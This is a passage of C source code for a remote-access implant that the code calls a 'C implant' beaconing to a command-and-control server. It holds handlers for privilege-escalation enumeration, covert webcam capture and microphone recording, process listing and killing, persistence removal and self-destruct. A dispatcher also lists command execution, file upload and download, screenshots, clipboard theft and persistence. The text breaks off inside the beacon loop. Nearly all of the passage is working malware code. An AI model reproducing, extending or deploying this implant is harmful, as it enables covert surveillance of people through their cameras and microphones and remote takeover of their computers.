                char *nl = strchr(trimmed, '\n'); if (nl) *nl = '\0';
                if (strcmp(trimmed, marker) == 0) { skip = 2; found = 1; continue; }
                if (skip > 0) { skip--; continue; }
                str_cat(&content, line);
            }
            fclose(f);
            if (found) {
                f = fopen(bashrc_path, "w");
                if (f) { fwrite(content.d, 1, content.len, f); fclose(f); }
                str_cat(&results, "~/.bashrc: entry removed\n");
            } else {
                str_cat(&results, "~/.bashrc: no entry found\n");
            }
            str_free(&content);
        } else {
            str_cat(&results, "~/.bashrc: cannot read file\n");
        }
    }

    /* ── systemd (not supported in C implant) ── */
    str_cat(&results, "systemd: no service found\n");

    char *result = res_ok(tid, "unpersist", results.d);
    str_free(&results);
    return result;
}

/* privesc_enum -------------------------------------------------------------- */
static char *h_privesc_enum(const char *task, int tid) {
    (void)task;
    str_t out; str_init(&out);

    str_cat(&out, "[ID]\n");
    { char *r = run_cmd("id 2>&1");
      str_cat(&out, r); free(r); str_cat(&out, "\n\n"); }

    str_cat(&out, "[SUDO]\n");
    { char *r = run_cmd("sudo -l -n 2>&1");
      str_cat(&out, r); free(r); str_cat(&out, "\n\n"); }

    str_cat(&out, "[SUID]\n");
#if defined(__APPLE__)
    { char *r = run_cmd("find /usr/bin /usr/sbin /bin /sbin /usr/local/bin "
                        "-perm -4000 -type f 2>/dev/null | head -30");
      str_cat(&out, r); free(r); str_cat(&out, "\n\n"); }
#else
    { char *r = run_cmd("find /usr /bin /sbin /opt /tmp /var -perm -4000 "
                        "-type f 2>/dev/null | head -30");
      str_cat(&out, r); free(r); str_cat(&out, "\n\n"); }
#endif

    str_cat(&out, "[WRITABLE /etc]\n");
    { char *r = run_cmd("find /etc -writable -type f 2>/dev/null | head -20");
      str_cat(&out, r); free(r); str_cat(&out, "\n\n"); }

#if defined(__APPLE__)
    /* getcap is not available on macOS; check SIP status instead */
    str_cat(&out, "[CAPABILITIES]\n");
    { char *r = run_cmd("csrutil status 2>/dev/null");
      str_cat(&out, r ? r : "csrutil not available"); free(r); str_cat(&out, "\n\n"); }
#else
    str_cat(&out, "[CAPABILITIES]\n");
    { char *r = run_cmd("getcap -r /usr/bin /usr/sbin /bin /sbin 2>/dev/null");
      str_cat(&out, r); free(r); str_cat(&out, "\n\n"); }
#endif

    str_cat(&out, "[ENVIRONMENT]\n");
#if defined(__APPLE__)
    { char *r = run_cmd("env 2>/dev/null | grep -E "
                        "'^(PATH|LD_PRELOAD|LD_LIBRARY_PATH|PYTHONPATH|HOME|USER|SHELL"
                        "|DYLD_INSERT_LIBRARIES|DYLD_LIBRARY_PATH)='");
      str_cat(&out, r); free(r); }
#else
    { char *r = run_cmd("env 2>/dev/null | grep -E "
                        "'^(PATH|LD_PRELOAD|LD_LIBRARY_PATH|PYTHONPATH|HOME|USER|SHELL)='");
      str_cat(&out, r); free(r); }
#endif

    char *result = res_ok(tid, "privesc_enum", out.d);
    str_free(&out);
    return result;
}

/* sysinfo ------------------------------------------------------------------- */
static char *h_sysinfo(const char *task, int tid) {
    (void)task;
    str_t out; str_init(&out);

    char hostname[256] = "unknown";
    gethostname(hostname, sizeof(hostname)-1);
    str_fmt(&out, "Hostname:  %s\n", hostname);

    struct utsname un;
    if (uname(&un) == 0)
        str_fmt(&out, "OS:        %s %s %s\n", un.sysname, un.release, un.machine);
    else
        str_fmt(&out, "OS:        %s\n", PLATFORM_NAME);

    struct passwd *pw = getpwuid(getuid());
    str_fmt(&out, "User:      %s (uid=%d euid=%d gid=%d)\n",
            pw ? pw->pw_name : (getenv("USER") ? getenv("USER") : "?"),
            (int)getuid(), (int)geteuid(), (int)getgid());

    /* ── Uptime ── */
#if defined(__APPLE__)
    {
        struct timeval boottime; size_t btsz = sizeof(boottime);
        if (sysctlbyname("kern.boottime", &boottime, &btsz, NULL, 0) == 0) {
            time_t now = time(NULL);
            long up = (long)(now - boottime.tv_sec);
            long d=up/86400, h=(up%86400)/3600, m=(up%3600)/60;
            str_fmt(&out, "Uptime:    %ldd %ldh %ldm\n", d, h, m);
        }
    }
#elif !defined(_WIN32)
    {
        FILE *f = fopen("/proc/uptime", "r");
        if (f) {
            double up; fscanf(f, "%lf", &up); fclose(f);
            long d=(long)up/86400, h=((long)up%86400)/3600, m=((long)up%3600)/60;
            str_fmt(&out, "Uptime:    %ldd %ldh %ldm\n", d, h, m);
        }
    }
#endif

    /* ── Memory ── */
#if defined(__APPLE__)
    {
        uint64_t memsize = 0; size_t msz = sizeof(memsize);
        sysctlbyname("hw.memsize", &memsize, &msz, NULL, 0);
        char *vm = run_cmd("vm_stat 2>/dev/null | awk '/Pages free/{print $3}' | tr -d '.'");
        long free_pages = vm ? atol(vm) : 0; free(vm);
        str_fmt(&out, "Memory:    %llu MB total, ~%ld MB free\n",
                (unsigned long long)memsize / (1024*1024), free_pages * 4096 / (1024*1024));
    }
#elif !defined(_WIN32)
    {
        FILE *f = fopen("/proc/meminfo", "r");
        if (f) {
            char line[256]; long total=0, avail=0;
            while (fgets(line, sizeof(line), f)) {
                if (strncmp(line,"MemTotal:",9)==0)      sscanf(line,"MemTotal: %ld",&total);
                if (strncmp(line,"MemAvailable:",13)==0) sscanf(line,"MemAvailable: %ld",&avail);
            }
            fclose(f);
            str_fmt(&out, "Memory:    %ld MB total, %ld MB available\n", total/1024, avail/1024);
        }
    }
#endif

    /* ── CPU ── */
#if defined(__APPLE__)
    {
        char brand[256]="unknown"; size_t bsz=sizeof(brand);
        sysctlbyname("machdep.cpu.brand_string", brand, &bsz, NULL, 0);
        int cores=0; size_t csz=sizeof(cores);
        sysctlbyname("hw.logicalcpu", &cores, &csz, NULL, 0);
        str_fmt(&out, "CPU:       %s (%d cores)\n", brand, cores);
    }
#elif !defined(_WIN32)
    {
        FILE *f = fopen("/proc/cpuinfo", "r");
        if (f) {
            char line[512]; int cores=0; char model[256]="unknown";
            while (fgets(line, sizeof(line), f)) {
                if (strncmp(line,"processor",9)==0) cores++;
                if (strncmp(line,"model name",10)==0) {
                    char *p = strchr(line,':');
                    if (p) { p+=2; char *nl=strchr(p,'\n'); if(nl)*nl='\0';
                             strncpy(model,p,sizeof(model)-1); }
                }
            }
            fclose(f);
            str_fmt(&out, "CPU:       %s (%d cores)\n", model, cores);
        }
    }
#endif

    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd))) str_fmt(&out, "CWD:       %s\n", cwd);

    char self[PATH_MAX] = {0};
    get_self_path(self, sizeof(self));
    if (self[0]) str_fmt(&out, "Implant:   %s\n", self);

    str_fmt(&out, "PID:       %d\n", (int)getpid());
    str_fmt(&out, "Interval:  %ds\n", beacon_interval);

    char *result = res_ok(tid, "sysinfo", out.d);
    str_free(&out);
    return result;
}

/* ps ------------------------------------------------------------------------ */
static char *h_ps(const char *task, int tid) {
    (void)task;
    /* BSD ps (macOS) does not support --no-headers; skip the header row in parsing */
#if defined(__APPLE__) || defined(_WIN32)
    char *raw = run_cmd("ps aux 2>/dev/null");
#else
    char *raw = run_cmd("ps aux --no-headers 2>/dev/null");
#endif
    if (!raw || !raw[0]) {
        free(raw);
        return res_err(tid, "ps", "ps command failed");
    }

    str_t json; str_init(&json);
    str_fmt(&json,
        "{\"task_id\":%d,\"type\":\"ps\",\"ok\":true,\"format\":\"ps\",\"entries\":[",
        tid);

    int first = 1, count = 0;
    char *saveptr = NULL;
    char *line = strtok_r(raw, "\n", &saveptr);
    while (line) {
        /* ps aux: USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND */
        char user[64]="", cpu[8]="", mem[8]="", vsz[16]="",
             rss[16]="", tty[16]="", stat_s[8]="", start[16]="", tim[16]="";
        char cmd[2048] = "";
        int pid = 0;
        int n = sscanf(line,
            "%63s %d %7s %7s %15s %15s %15s %7s %15s %15s %2047[^\n]",
            user, &pid, cpu, mem, vsz, rss, tty, stat_s, start, tim, cmd);
        /* Skip the header row that BSD ps emits (second token is "PID") */
        if (n < 10 || strcmp(cpu, "PID") == 0 || strcmp(user, "USER") == 0) {
            line = strtok_r(NULL, "\n", &saveptr);
            continue;
        }
        {
            char *eu   = json_esc(user);
            char *ecpu = json_esc(cpu);
            char *emem = json_esc(mem);
            char *evsz = json_esc(vsz);
            char *erss = json_esc(rss);
            char *etty = json_esc(tty);
            char *est  = json_esc(stat_s);
            char *estt = json_esc(start);
            char *etm  = json_esc(tim);
            char *ecmd = json_esc(cmd);
            if (!first) str_cat(&json, ",");
            first = 0;
            count++;
            str_fmt(&json,
                "{\"user\":\"%s\",\"pid\":%d,\"cpu\":\"%s\",\"mem\":\"%s\","
                "\"vsz\":\"%s\",\"rss\":\"%s\",\"tty\":\"%s\","
                "\"stat\":\"%s\",\"start\":\"%s\",\"time\":\"%s\",\"cmd\":\"%s\"}",
                eu, pid, ecpu, emem, evsz, erss, etty, est, estt, etm, ecmd);
            free(eu); free(ecpu); free(emem); free(evsz); free(erss);
            free(etty); free(est); free(estt); free(etm); free(ecmd);
        }
        line = strtok_r(NULL, "\n", &saveptr);
    }
    free(raw);

    char count_str[64];
    snprintf(count_str, sizeof(count_str), "%d processes", count);
    char *ecs = json_esc(count_str);
    str_fmt(&json, "],\"output\":\"%s\"}", ecs);
    free(ecs);
    return json.d;
}

/* ls ------------------------------------------------------------------------ */
static char *h_ls(const char *task, int tid) {
    char *path = json_str(task, "path");
    if (!path || !path[0]) { free(path); path = strdup("."); }

    DIR *dp = opendir(path);
    if (!dp) {
        char msg[512];
        snprintf(msg, sizeof(msg), "%s: %s", path, strerror(errno));
        free(path);
        return res_err(tid, "ls", msg);
    }

    /* Build JSON manually: entries is an array of objects */
    str_t json; str_init(&json);
    char *ep = json_esc(path);
    str_fmt(&json,
        "{\"task_id\":%d,\"type\":\"ls\",\"ok\":true,\"format\":\"ls\","
        "\"path\":\"%s\",\"entries\":[",
        tid, ep);
    free(ep);

    int first = 1, ls_count = 0;
    struct dirent *ent;
    while ((ent = readdir(dp)) != NULL) {
        if (strcmp(ent->d_name,".")==0 || strcmp(ent->d_name,"..")==0) continue;
        char full[PATH_MAX];
        snprintf(full, sizeof(full), "%s/%s", path, ent->d_name);

        struct stat st;
        char type_ch = '?';
        char perms[11] = "----------";
        long size = 0;
        if (lstat(full, &st) == 0) {
            size = (long)st.st_size;
            if      (S_ISDIR(st.st_mode))  { type_ch='d'; perms[0]='d'; }
            else if (S_ISLNK(st.st_mode))  { type_ch='l'; perms[0]='l'; }
            else if (S_ISBLK(st.st_mode))  { type_ch='b'; perms[0]='b'; }
            else if (S_ISCHR(st.st_mode))  { type_ch='c'; perms[0]='c'; }
            else                           { type_ch='f'; perms[0]='-'; }
            perms[1] = (st.st_mode & S_IRUSR) ? 'r' : '-';
            perms[2] = (st.st_mode & S_IWUSR) ? 'w' : '-';
            perms[3] = (st.st_mode & S_IXUSR) ? 'x' : '-';
            perms[4] = (st.st_mode & S_IRGRP) ? 'r' : '-';
            perms[5] = (st.st_mode & S_IWGRP) ? 'w' : '-';
            perms[6] = (st.st_mode & S_IXGRP) ? 'x' : '-';
            perms[7] = (st.st_mode & S_IROTH) ? 'r' : '-';
            perms[8] = (st.st_mode & S_IWOTH) ? 'w' : '-';
            perms[9] = (st.st_mode & S_IXOTH) ? 'x' : '-';
        }

        if (!first) str_cat(&json, ",");
        first = 0;
        ls_count++;

        char *en  = json_esc(ent->d_name);
        char *efp = json_esc(full);
        char tcs[2] = { type_ch, '\0' };
        str_fmt(&json,
            "{\"name\":\"%s\",\"type\":\"%s\",\"perms\":\"%s\",\"size\":%ld,\"path\":\"%s\"}",
            en, tcs, perms, size, efp);
        free(en); free(efp);
    }
    closedir(dp);

    char ls_count_str[64];
    snprintf(ls_count_str, sizeof(ls_count_str), "%d entries", ls_count);
    char *ecs2 = json_esc(ls_count_str);
    str_fmt(&json, "],\"output\":\"%s\"}", ecs2);
    free(ecs2);
    free(path);
    return json.d;   /* caller owns this malloc'd string */
}

/* netstat ------------------------------------------------------------------- */
static char *h_netstat(const char *task, int tid) {
    (void)task;
#if defined(__APPLE__) || defined(_WIN32)
    /* macOS and Windows: use system command instead of /proc/net/tcp */
    const char *cmd =
#if defined(__APPLE__)
        "netstat -an 2>/dev/null";
#else
        "netstat -ano 2>NUL";
#endif
    char *output = run_cmd(cmd);
    char *result = res_ok(tid, "netstat", output ? output : "");
    free(output);
    return result;
#else
    static const char *TCP_STATES[] = {
        "","ESTABLISHED","SYN_SENT","SYN_RECV","FIN_WAIT1",
        "FIN_WAIT2","TIME_WAIT","CLOSE","CLOSE_WAIT","LAST_ACK",
        "LISTEN","CLOSING","UNKNOWN"
    };

    str_t out; str_init(&out);
    str_fmt(&out, "%-6s %-22s %-22s %s\n", "Proto","Local Address","Remote Address","State");
    str_fmt(&out, "%-6s %-22s %-22s %s\n", "-----","-------------","--------------","-----");

    const char *files[]  = { "/proc/net/tcp", "/proc/net/tcp6", NULL };
    const char *protos[] = { "tcp",           "tcp6",           NULL };

    for (int fi = 0; files[fi]; fi++) {
        FILE *f = fopen(files[fi], "r");
        if (!f) continue;
        char line[512];
        fgets(line, sizeof(line), f); /* skip header */
        while (fgets(line, sizeof(line), f)) {
            char laddr[64], raddr[64], state_hex[8];
            int  sl;
            if (sscanf(line," %d: %63s %63s %7s",&sl,laddr,raddr,state_hex) != 4) continue;
            int state = (int)strtol(state_hex, NULL, 16);
            if (state < 1 || state > 11) state = 12;

            char lip_s[48]="?", rip_s[48]="?";
            if (fi == 0) { /* IPv4 */
                unsigned int lip, lport, rip, rport;
                if (sscanf(laddr,"%X:%X",&lip,&lport)==2)
                    snprintf(lip_s,sizeof(lip_s),"%u.%u.%u.%u:%u",
                             lip&0xFF,(lip>>8)&0xFF,(lip>>16)&0xFF,(lip>>24)&0xFF,lport);
                if (sscanf(raddr,"%X:%X",&rip,&rport)==2)
                    snprintf(rip_s,sizeof(rip_s),"%u.%u.%u.%u:%u",
                             rip&0xFF,(rip>>8)&0xFF,(rip>>16)&0xFF,(rip>>24)&0xFF,rport);
            } else { /* IPv6 — just show port */
                unsigned int lport=0, rport=0;
                char *lc = strrchr(laddr,':'), *rc = strrchr(raddr,':');
                if (lc) { sscanf(lc+1,"%X",&lport); snprintf(lip_s,sizeof(lip_s),"[::6]:%u",lport); }
                if (rc) { sscanf(rc+1,"%X",&rport); snprintf(rip_s,sizeof(rip_s),"[::6]:%u",rport); }
            }

            str_fmt(&out, "%-6s %-22s %-22s %s\n",
                    protos[fi], lip_s, rip_s, TCP_STATES[state]);
        }
        fclose(f);
    }

    char *result = res_ok(tid, "netstat", out.d);
    str_free(&out);
    return result;
#endif /* !__APPLE__ && !_WIN32 */
}

/* kill_process -------------------------------------------------------------- */
static char *h_kill_process(const char *task, int tid) {
    int pid = json_int(task, "pid", 0);
    int sig = json_int(task, "signal", 15);
    if (pid <= 0) return res_err(tid, "kill_process", "Missing or invalid pid");
    if (kill((pid_t)pid, sig) == 0) {
        char msg[64];
        snprintf(msg, sizeof(msg), "Sent signal %d to PID %d", sig, pid);
        return res_ok(tid, "kill_process", msg);
    }
    char msg[128];
    snprintf(msg, sizeof(msg), "kill(%d, %d): %s", pid, sig, strerror(errno));
    return res_err(tid, "kill_process", msg);
}

/* webcam_snap --------------------------------------------------------------- */
/* ── stb write-to-memory callback ─────────────────────────────────────────── */
typedef struct { unsigned char *buf; size_t len; size_t cap; } stb_mem_t;
static void stb_mem_write(void *ctx, void *data, int size) {
    stb_mem_t *m = (stb_mem_t *)ctx;
    if (m->len + (size_t)size > m->cap) {
        m->cap = (m->len + (size_t)size) * 2 + 4096;
        m->buf = realloc(m->buf, m->cap);
    }
    memcpy(m->buf + m->len, data, (size_t)size);
    m->len += (size_t)size;
}

/* YUYV → RGB888 (in-place expand into separate rgb buffer) */
static unsigned char *yuyv_to_rgb(const unsigned char *yuyv, int w, int h) {
    unsigned char *rgb = malloc((size_t)(w * h * 3));
    for (int i = 0; i < w * h / 2; i++) {
        int y0 = yuyv[4*i+0], u  = yuyv[4*i+1];
        int y1 = yuyv[4*i+2], v  = yuyv[4*i+3];
        int c0 = y0 - 16, c1 = y1 - 16;
        int d  = u  - 128, e = v - 128;
#define CLAMP8(x) ((x)<0?0:(x)>255?255:(x))
        rgb[6*i+0] = (unsigned char)CLAMP8((298*c0 + 409*e + 128) >> 8);
        rgb[6*i+1] = (unsigned char)CLAMP8((298*c0 - 100*d - 208*e + 128) >> 8);
        rgb[6*i+2] = (unsigned char)CLAMP8((298*c0 + 516*d + 128) >> 8);
        rgb[6*i+3] = (unsigned char)CLAMP8((298*c1 + 409*e + 128) >> 8);
        rgb[6*i+4] = (unsigned char)CLAMP8((298*c1 - 100*d - 208*e + 128) >> 8);
        rgb[6*i+5] = (unsigned char)CLAMP8((298*c1 + 516*d + 128) >> 8);
#undef CLAMP8
    }
    return rgb;
}

static char *h_webcam_snap(const char *task, int tid) {
    char *device_arg = json_str(task, "device");
    const char *device = (device_arg && device_arg[0]) ? device_arg : "/dev/video0";

#if defined(_WIN32)
    /* PowerShell DirectShow */
    const char *tmp = "/tmp/.c2_wcam.jpg";
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "powershell -NoProfile -Command \""
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
        "$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height;"
        "$g=[Drawing.Graphics]::FromImage($bmp);"
        "$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);"
        "$bmp.Save('%s');$g.Dispose();$bmp.Dispose()\"", tmp);
    char *out = run_cmd(cmd); free(out);
    free(device_arg);
    FILE *f = fopen(tmp, "rb");
    if (!f) return res_err(tid, "webcam_snap", "webcam_snap failed (Windows)");
    fseek(f,0,SEEK_END); long sz=ftell(f); fseek(f,0,SEEK_SET);
    unsigned char *buf=malloc((size_t)sz); fread(buf,1,(size_t)sz,f); fclose(f); unlink(tmp);
    char *b64=b64_enc(buf,(size_t)sz); free(buf);
    char *result=res_ok_data(tid,"webcam_snap",b64,"jpeg",NULL); free(b64);
    return result;

#elif defined(__APPLE__)
    /* macOS: imagesnap → ffmpeg avfoundation */
    const char *tmp = "/tmp/.c2_wcam.jpg";
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "imagesnap -q '%s' 2>&1", tmp);
    char *out = run_cmd(cmd); free(out);
    if (access(tmp, F_OK) != 0) {
        snprintf(cmd, sizeof(cmd),
                 "ffmpeg -y -f avfoundation -i '0' -frames:v 1 '%s' 2>&1", tmp);
        out = run_cmd(cmd); free(out);
    }
    free(device_arg);
    FILE *f = fopen(tmp, "rb");
    if (!f) return res_err(tid, "webcam_snap",
                           "webcam_snap failed: install imagesnap (brew install imagesnap)");
    fseek(f,0,SEEK_END); long sz=ftell(f); fseek(f,0,SEEK_SET);
    unsigned char *buf=malloc((size_t)sz); fread(buf,1,(size_t)sz,f); fclose(f); unlink(tmp);
    char *b64=b64_enc(buf,(size_t)sz); free(buf);
    char *result=res_ok_data(tid,"webcam_snap",b64,"jpeg",NULL); free(b64);
    return result;

#else
    /* Linux: V4L2 direct — no external tools needed */
    int fd = open(device, O_RDWR);
    if (fd < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "open(%s): %s", device, strerror(errno));
        free(device_arg);
        return res_err(tid, "webcam_snap", msg);
    }

    /* Verify capture capability */
    struct v4l2_capability cap;
    if (ioctl(fd, VIDIOC_QUERYCAP, &cap) < 0 ||
        !(cap.capabilities & V4L2_CAP_VIDEO_CAPTURE)) {
        close(fd); free(device_arg);
        return res_err(tid, "webcam_snap", "Not a V4L2 capture device");
    }

    /* Try MJPEG first (camera does JPEG compression, no conversion needed) */
    struct v4l2_format fmt;
    memset(&fmt, 0, sizeof(fmt));
    fmt.type                = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    fmt.fmt.pix.width       = 640;
    fmt.fmt.pix.height      = 480;
    fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_MJPEG;
    fmt.fmt.pix.field       = V4L2_FIELD_NONE;
    int mjpeg = (ioctl(fd, VIDIOC_S_FMT, &fmt) == 0 &&
                 fmt.fmt.pix.pixelformat == V4L2_PIX_FMT_MJPEG);

    if (!mjpeg) {
        /* Fall back to YUYV */
        memset(&fmt, 0, sizeof(fmt));
        fmt.type                = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        fmt.fmt.pix.width       = 640;
        fmt.fmt.pix.height      = 480;
        fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_YUYV;
        fmt.fmt.pix.field       = V4L2_FIELD_NONE;
        if (ioctl(fd, VIDIOC_S_FMT, &fmt) < 0) {
            close(fd); free(device_arg);
            return res_err(tid, "webcam_snap", "Could not set MJPEG or YUYV format");
        }
    }
    int width  = (int)fmt.fmt.pix.width;
    int height = (int)fmt.fmt.pix.height;

    /* Request 1 mmap buffer */
    struct v4l2_requestbuffers req;
    memset(&req, 0, sizeof(req));
    req.count  = 1;
    req.type   = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    req.memory = V4L2_MEMORY_MMAP;
    if (ioctl(fd, VIDIOC_REQBUFS, &req) < 0 || req.count < 1) {
        close(fd); free(device_arg);
        return res_err(tid, "webcam_snap", "REQBUFS failed");
    }

    struct v4l2_buffer buf_info;
    memset(&buf_info, 0, sizeof(buf_info));
    buf_info.type   = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    buf_info.memory = V4L2_MEMORY_MMAP;
    buf_info.index  = 0;
    if (ioctl(fd, VIDIOC_QUERYBUF, &buf_info) < 0) {
        close(fd); free(device_arg);
        return res_err(tid, "webcam_snap", "QUERYBUF failed");
    }

    void *mapped = mmap(NULL, buf_info.length, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, buf_info.m.offset);
    if (mapped == MAP_FAILED) {
        close(fd); free(device_arg);
        return res_err(tid, "webcam_snap", "mmap failed");
    }

    /* Queue buffer + start stream */
    memset(&buf_info, 0, sizeof(buf_info));
    buf_info.type   = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    buf_info.memory = V4L2_MEMORY_MMAP;
    buf_info.index  = 0;
    ioctl(fd, VIDIOC_QBUF, &buf_info);
    enum v4l2_buf_type btype = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    ioctl(fd, VIDIOC_STREAMON, &btype);

/* Helper: wait up to timeout_sec for camera fd to have a frame ready.
   Returns 1 if ready, 0 on timeout, -1 on error. */
#define V4L2_WAIT(fd_, secs_) ({ \
    fd_set _fds; struct timeval _tv = {(secs_), 0}; \
    FD_ZERO(&_fds); FD_SET((fd_), &_fds); \
    select((fd_)+1, &_fds, NULL, NULL, &_tv); })

    /* Drain one warmup frame (auto-exposure settle). Skip if not ready within 3s. */
    if (V4L2_WAIT(fd, 3) > 0) {
        memset(&buf_info, 0, sizeof(buf_info));
        buf_info.type   = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf_info.memory = V4L2_MEMORY_MMAP;
        if (ioctl(fd, VIDIOC_DQBUF, &buf_info) == 0)
            ioctl(fd, VIDIOC_QBUF, &buf_info);
    }

    /* Capture final frame — wait up to 5s */
    if (V4L2_WAIT(fd, 5) <= 0) {
        ioctl(fd, VIDIOC_STREAMOFF, &btype);
        munmap(mapped, buf_info.length);
        close(fd); free(device_arg);
        return res_err(tid, "webcam_snap", "DQBUF timeout: camera not ready within 5s");
    }
    memset(&buf_info, 0, sizeof(buf_info));
    buf_info.type   = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    buf_info.memory = V4L2_MEMORY_MMAP;
    if (ioctl(fd, VIDIOC_DQBUF, &buf_info) < 0) {
        ioctl(fd, VIDIOC_STREAMOFF, &btype);
        munmap(mapped, buf_info.length);
        close(fd); free(device_arg);
        return res_err(tid, "webcam_snap", "DQBUF failed (frame capture)");
    }

    /* Encode to JPEG */
    stb_mem_t jpeg_out = {0};
    jpeg_out.buf = malloc(65536); jpeg_out.cap = 65536;

    char *result = NULL;
    if (mjpeg) {
        /* Already JPEG — use as-is */
        char *b64 = b64_enc((unsigned char *)mapped, buf_info.bytesused);
        result = res_ok_data(tid, "webcam_snap", b64, "jpeg", NULL);
        free(b64);
    } else {
        /* YUYV → RGB → JPEG via stb */
        unsigned char *rgb = yuyv_to_rgb((unsigned char *)mapped, width, height);
        stbi_write_jpg_to_func(stb_mem_write, &jpeg_out, width, height, 3, rgb, 85);
        free(rgb);
        char *b64 = b64_enc(jpeg_out.buf, jpeg_out.len);
        result = res_ok_data(tid, "webcam_snap", b64, "jpeg", NULL);
        free(b64);
    }
    free(jpeg_out.buf);

    ioctl(fd, VIDIOC_STREAMOFF, &btype);
    munmap(mapped, buf_info.length);
    close(fd);
    free(device_arg);
    return result;
#endif
}

/* mic_record ---------------------------------------------------------------- */
static char *h_mic_record(const char *task, int tid) {
    int   duration   = json_int(task, "duration", 5);
    char *device_arg = json_str(task, "device");
    const char *device = (device_arg && device_arg[0]) ? device_arg : "default";

    if (duration <= 0 || duration > 300) {
        free(device_arg);
        return res_err(tid, "mic_record", "Duration must be 1-300 seconds");
    }

    const char *tmp = "/tmp/.c2_mic.wav";
    char cmd[512];

#if defined(_WIN32)
    snprintf(cmd, sizeof(cmd),
        "powershell -NoProfile -Command \""
        "Add-Type -AssemblyName System.Speech;"
        "$r=New-Object System.Media.SoundRecorder;"
        "$r.BeginRecording('%s');"
        "Start-Sleep %d;"
        "$r.EndRecording()\"",
        tmp, duration);
    char *out = run_cmd(cmd); free(out);
#elif defined(__APPLE__)
    snprintf(cmd, sizeof(cmd),
             "sox -d -t wav '%s' trim 0 %d 2>&1", tmp, duration);
    char *out = run_cmd(cmd); free(out);
    if (access(tmp, F_OK) != 0) {
        snprintf(cmd, sizeof(cmd),
                 "ffmpeg -y -f avfoundation -i ':0' -t %d '%s' 2>&1", duration, tmp);
        out = run_cmd(cmd); free(out);
    }
#else
    /* Linux: try arecord → ffmpeg alsa */
    snprintf(cmd, sizeof(cmd),
             "arecord -D '%s' -d %d -f cd '%s' 2>&1", device, duration, tmp);
    char *out = run_cmd(cmd); free(out);
    if (access(tmp, F_OK) != 0) {
        snprintf(cmd, sizeof(cmd),
                 "ffmpeg -y -f alsa -i '%s' -t %d '%s' 2>&1", device, duration, tmp);
        out = run_cmd(cmd); free(out);
    }
#endif

    free(device_arg);

    FILE *f = fopen(tmp, "rb");
    if (!f) return res_err(tid, "mic_record",
#if defined(_WIN32)
                           "mic_record failed: no audio tool available"
#elif defined(__APPLE__)
                           "mic_record failed: install sox (brew install sox)"
#else
                           "mic_record failed: install alsa-utils or ffmpeg"
#endif
    );
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    unsigned char *buf = malloc((size_t)sz);
    size_t nr = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    unlink(tmp);
    char *b64 = b64_enc(buf, nr);

    /* Build result — str_fmt buf is 8192 bytes so build large data field with str_cat */
    char *result;
    {
        str_t s; str_init(&s);
        str_fmt(&s, "{\"task_id\":%d,\"type\":\"mic_record\",\"ok\":true,"
                    "\"format\":\"wav\",\"duration\":%d,\"data\":\"",
                    tid, duration);
        str_cat(&s, b64);   /* WAV b64 can be hundreds of KB */
        str_cat(&s, "\"}");
        result = s.d;
    }
    free(buf); free(b64);
    return result;
}

/* self_destruct ------------------------------------------------------------- */
static char *h_self_destruct(const char *task, int tid) {
    (void)task;
    /* Remove persistence entries first */
    char *up = h_unpersist("{}", tid);
    free(up);

    char self[PATH_MAX] = {0};
    get_self_path(self, sizeof(self));
    if (!self[0]) {
        return res_ok(tid, "self_destruct",
                      "Persistence removed; could not determine own path to delete");
    }

    /* Fork child to unlink us after we've had a chance to send the result */
    pid_t child = fork();
    if (child == 0) {
        sleep(3);
        unlink(self);
        _exit(0);
    }

    char msg[PATH_MAX + 64];
    snprintf(msg, sizeof(msg),
             "Self-destruct initiated: persistence removed, %s will be deleted in 3s", self);

    g_self_destruct = 1;   /* beacon_loop checks this after posting result */
    return res_ok(tid, "self_destruct", msg);
}

// ── Task dispatcher ───────────────────────────────────────────────────────────

static char *dispatch(const char *task_json) {
    int   tid  = json_int(task_json, "task_id", 0);
    char *type = json_str(task_json, "type");
    if (!type) return res_err(tid, "unknown", "Missing task type");

    char *result;
    if      (!strcmp(type,"execute"))       result = h_execute(task_json, tid);
    else if (!strcmp(type,"upload"))        result = h_upload(task_json, tid);
    else if (!strcmp(type,"download"))      result = h_download(task_json, tid);
    else if (!strcmp(type,"set_interval"))  result = h_set_interval(task_json, tid);
    else if (!strcmp(type,"screenshot"))    result = h_screenshot(task_json, tid);
    else if (!strcmp(type,"webcam_snap"))   result = h_webcam_snap(task_json, tid);
    else if (!strcmp(type,"mic_record"))    result = h_mic_record(task_json, tid);
    else if (!strcmp(type,"clipboard"))     result = h_clipboard(task_json, tid);
    else if (!strcmp(type,"persist"))       result = h_persist(task_json, tid);
    else if (!strcmp(type,"unpersist"))     result = h_unpersist(task_json, tid);
    else if (!strcmp(type,"privesc_enum"))  result = h_privesc_enum(task_json, tid);
    else if (!strcmp(type,"sysinfo"))       result = h_sysinfo(task_json, tid);
    else if (!strcmp(type,"ps"))            result = h_ps(task_json, tid);
    else if (!strcmp(type,"ls"))            result = h_ls(task_json, tid);
    else if (!strcmp(type,"netstat"))       result = h_netstat(task_json, tid);
    else if (!strcmp(type,"kill_process"))  result = h_kill_process(task_json, tid);
    else if (!strcmp(type,"self_destruct")) result = h_self_destruct(task_json, tid);
    else {
        char msg[128];
        snprintf(msg, sizeof(msg), "Unsupported task type in C implant: %s", type);
        result = res_err(tid, type, msg);
    }
    free(type);
    return result;
}

// ── Beacon loop ───────────────────────────────────────────────────────────────

static void jitter_sleep(void) {
    double jitter = 1.0 - JITTER_FACTOR
